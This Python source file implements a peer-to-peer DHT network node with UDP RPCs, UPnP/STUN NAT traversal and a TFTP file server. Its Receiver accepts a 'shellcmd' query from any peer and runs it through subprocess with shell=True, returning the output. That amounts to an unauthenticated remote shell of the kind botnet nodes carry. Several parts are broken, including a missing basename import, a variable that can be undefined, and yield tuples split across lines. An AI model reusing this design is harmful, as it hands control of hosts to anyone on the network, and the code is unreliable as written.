import subprocess
import random

import logging as log
logging = log.getLogger("networkio")

#import base64
#from os.path import basename

from socket import socket, AF_INET, SOCK_DGRAM, gethostname, gethostbyname
from config import KEY, PACKET_SIZE, ADDRESS_SPACE
from virtual_co import UDPSocket

from cachedb import DB, kBucket
cache = DB()

class Sender(object):


    def __init__(self, send_dest, recv_dest, uuid):
        self.recv_dest = recv_dest
        self.send_dest = send_dest ## hardening, tcp over udp magic

        sucky = socket(AF_INET, SOCK_DGRAM)
        sucky.connect(send_dest)
        self.sock = UDPSocket(sucky)
        self.uuid = uuid


    def send_query(self, data, query_type, rpc_no):
        msg = { "data": data,
                "type": "query",
                "query_type": query_type,
                "rpc_no": rpc_no,
                "uuid": self.uuid,
                "recv_dest": self.recv_dest ,
                "send_dest": self.send_dest }

        logging.debug("Sending packet {0}".format(msg))
        yield self.sock.send(msg, self.send_dest)



    def send_error(self, err, rpc_no):
        msg = { "data": err,
                "type": "err",
                "rpc_no": rpc_no,
                "uuid": self.uuid,
                "recv_dest": self.recv_dest,
                "send_dest": self.send_dest
        }
        yield self.sock.send(msg, self.send_dest)


    def send_resp(self, resp, rpc_no):
        msg = {
            "data": resp,
            "type": "resp",
            "rpc_no": rpc_no,
            "uuid": self.uuid,
            "recv_dest": self.recv_dest,
            "send_dest": self.send_dest
        }
        yield self.sock.send(msg, self.send_dest)


    def send_file(self, filename):
        import tftpy
        client = tftpy.TftpClient(self.send_dest[0],
                                  self.send_dest[1] + 1)
        client.upload(filename, basename(filename))


class Receiver(object):


    def __init__(self, server=("0.0.0.0", 0)):
        sucky = socket(AF_INET, SOCK_DGRAM)
        logging.debug("Hostname: {0} ({1})".format(
            gethostname(), gethostbyname(gethostname())))
        sucky.bind(server)
        self.addr = sucky.getsockname()
        logging.debug("Socket bind: {0}".format(self.addr))
        self.sock = UDPSocket(sucky)
        self.server = server


    def recv(self):
        packet, addr = yield self.sock.recv()
        logging.debug("Received packet {0} from {1}.".format(packet, addr))

        routing_table = kBucket(cache["addr"], cache["port"], cache["uuid"])
        routing_table.insert(addr[0], addr[1], packet["uuid"])
        logging.debug("Routing table updated: ({0}, {1}, {2})".format(
                    addr[0], addr[1], packet["uuid"]))
        
        if packet["type"] == "query":
            ## unpack => (resp, addr, rpc_no, uuid)

                if packet["query_type"] == "shellcmd":
                    unpack = (self.handle_shellcmd(packet),
                              packet["recv_dest"],
                              packet["rpc_no"],
                              packet["uuid"])
                    yield unpack

                if packet["query_type"] == "ping":
                    # ping(): pong
                    unpack = ("pong",
                              packet["recv_dest"],
                              packet["rpc_no"],
                              packet["uuid"])
                    yield unpack

                if packet["query_type"] == "store":
                    # store(key, value h_key): True
                    resp = True
                    try:
                        cache["values"].update({packet["data"][2]: 
                                            (packet["data"][0], packet["data"][1])})
                    except Exception:
                        resp = False

                    unpack = (resp,
                              packet["recv_dest"],
                              packet["rpc_no"],
                              packet["uuid"])
                    yield unpack


                if packet["query_type"] == "find_node":  
                    # find_node(hkey): k_nearest | node
                    nearest = routing_table.get_nearest_nodes(packet["data"])
                    if nearest[0][2] == packet["data"]:
                        resp = nearest[0]
                    else:
                        resp = nearest
                    yield resp, packet["recv_dest"],
                    packet["rpc_no"], packet["uuid"]

                if packet["query_type"] == "find_value":
                    # find_value(hkey): k_nearest | value
                    resp = cache["values"].get(packet["data"], None)
                    if resp is None:
                        resp = routing_table.get_nearest_nodes(packet["data"])
                    yield resp, packet["recv_dest"],
                    packet["rpc_no"], packet["uuid"]



        if packet["type"] == "err":
            yield packet, addr, packet["rpc_no"], packet["uuid"]

        if packet["type"] == "resp":
            yield packet, addr, packet["rpc_no"], packet["uuid"]



    def handle_shellcmd(self, data):
        try:
            proc = subprocess.Popen(data["data"],
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            resp = proc.stdout.read() + proc.stderr.read()
        except:
            logging.error("Subprocess Popen execution error")

        return resp


    def get_addr(self):
        return self.addr


    def get_ip(self):
        return self.addr[0]


    def get_port(self):
        return self.addr[1]



from collections import deque
from multiprocessing import Process
from time import time, sleep
from utility import do_UPNP_mapping, tftp_server


request_buffer = deque()
response_buffer = deque()

packets_sent = list()

t_recv_buffer = deque()
t_refresher_buff = deque()

def SenderTask():
    logging.info("Starting a SenderTask.")
    global response_buffer
    global request_buffer
    global packets_sent
    global t_recv_buffer

    while True:
        if len(t_recv_buffer) > 0:
            msg_recv = t_recv_buffer.popleft()
            logging.warning("T_RECV_BUFFER: {0}".format(len(t_recv_buffer)))
            rpc_resp_index = [i for i,v in enumerate(packets_sent) if v == msg_recv["rpc_no"] ]
            logging.warning("RPC_RESP_INDEX: {0}".format(rpc_resp_index))
            logging.warning("PACKETS_SENT: {0}".format(packets_sent))
            if not rpc_resp_index:
                logging.debug("Received packet is request. Sending answer.")
                sender = Sender(msg_recv["addr"],
                                (cache["addr"], cache["port"]),
                                cache["uuid"])
                yield sender.send_resp(msg_recv["resp"], msg_recv["rpc_no"])
            else:
                packets_sent.pop(rpc_resp_index[0])
                logging.debug("Received packet is response. Saving to response_buffer.")
                response_buffer.append(msg_recv)
                
        if len(request_buffer) > 0:
            msg = request_buffer.popleft()
            logging.debug("Request buffer received packet: {0}".format(msg))
            if 'send_to' in msg:
                sender = Sender(msg["send_to"],
                                (cache["addr"], cache["port"]),
                                cache["uuid"])
                if 'query_data' in msg:
                    msg["rpc_no"] = random.getrandbits(ADDRESS_SPACE)
                    msg["time"] = time()
                    packets_sent.append(msg["rpc_no"])
                    del msg["time"]
                    yield sender.send_query(msg["query_data"],
                                            msg["query_type"],
                                            msg["rpc_no"])
                elif 'error' in msg:
                    pass  # TODO:
                elif 'resp' in msg:
                    pass  # TODO:
                elif 'query_file' in msg:
                    pass  # TODO:
                
            
        yield
                

def ReceiverTask(addr, port):
    receiver = Receiver((addr, port))
    addr, port = receiver.get_addr()
    cache["addr"], cache["port"] = addr, port
    logging.info("Initialize a ReceiverTask@{0}:{1}".format(addr, port))
    
    port_map = [(port, "UDP"), (port + 1, "UDP")]
    external_ip = do_UPNP_mapping(port_map)
    if external_ip:
        logging.info("[+] uPnP maps:{0}:{1} -> {2}:{3}".format(
            addr, port, external_ip, port))
        cache["addr"], cache["port"] = external_ip, port
    else:
        # Do STUN probe
        logging.info("[-] external_ip unknown: sending STUN probe...")
        import stun
        nat_type, external_ip, external_port = stun.get_ip_info()
        logging.info("[+] STUN probe: {0}:{1}, {2}".format(
            external_ip, external_port, nat_type))
        cache["addr"], cache["port"] = external_ip, port #, external_port
        
        # TODO: if nat_type == symmetric -> import turn

    logging.info("cache['addr'] = {0}, cache['port'] = {1}".format(
        cache["addr"], cache["port"]))
    
    p = Process(target=tftp_server, args=(port + 1, "./tasks/"))
    p.start()

    global t_recv_buffer
    while True:
        resp, addr, rpc_no, uuid = yield receiver.recv()
        t_recv_buffer.append({"resp": resp, 
                              "addr": addr,
                              "rpc_no": rpc_no,
                              "uuid": uuid })

priority_task = deque()
def RefresherTask():
    logging.info("RefresherTask started...")
    while True:
        sleep(.1)
        yield
        

def IterativeFindNode(key_uuid):
    logging.info("Initiating IterativeFindNode() task")

def IterativeStore():
    logging.info("Initiating IterativeStore() task")
    

def IterativeFindValue():
    logging.info("Initiating IterativeFindValue() task")
        